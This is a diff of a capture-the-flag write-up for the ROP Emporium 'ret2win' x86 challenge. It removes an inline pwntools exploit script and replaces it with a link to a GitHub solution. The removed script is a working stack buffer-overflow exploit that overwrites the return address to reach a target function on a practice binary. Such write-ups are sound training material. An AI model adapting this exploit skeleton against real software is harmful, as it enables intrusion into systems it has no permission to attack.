@@ -79,76 +79,7 @@ $ sudo dmesg
 ```
 
 The exploit for x86 is simple (would use it as a skeleton for most of the challenges):
-```python
-import pwn  
-import logging  
-  
+[solution][script-x86]
 
-logger = logging.getLogger(__name__)  
-  
-DEBUG = True  
-BINARY = './ret2win32'  
-GOAL_FUNCTION = 'ret2win'  
-GOAL_ADDRESS = 0  
-  
-GDB_SCRIPT = f'''  
-set pagination off  
-set disassembly-flavor intel  
-  
-b *0x804862c  
-commands printf "woot, reached goal address"  
-bt  
-c  
-end  
-  
-c  
-'''  
-  
-  
-def set_properties(elf):  
-    global GOAL_ADDRESS  
-    GOAL_ADDRESS = elf.symbols[GOAL_FUNCTION]  
-  
-    pwn.context.bits = elf.bits  
-    pwn.context.endian = elf.endian  
-    pwn.context.arch = elf.arch  
-    pwn.context.log_level = 'debug'  
-  
-  
-def create_shellcode():  
-    shellcode = b''  
-    shellcode += 44 * b'A'  
-    shellcode += pwn.p32(GOAL_ADDRESS)  
-  
-    logging.info(f'Created shellcode:\n{shellcode}')  
-  
-    return shellcode  
-  
-  
-def exploit(p, shellcode):  
-    if DEBUG:  
-        pwn.gdb.attach(p, GDB_SCRIPT)  
-  
-    p.sendline(shellcode)  
-    p.recvuntil('Thank you!')  
-  
-    data = p.recvall()  
-    logger.info(f'FLAG:{data}')  
-  
-    p.interactive()  
-  
-  
-def main():  
-    elf = pwn.ELF(BINARY)  
-    set_properties(elf)  
-  
-    shellcode = create_shellcode()  
-  
-    p = pwn.process(BINARY)  
-  
-    exploit(p, shellcode)  
-  
-  
-if __name__ == '__main__':  
-    main()
-```
+
+[script-x86] https://github.com/itaysnir/ROP-Emporium-Solutions/blob/main/ret2win/x86/exploit.py
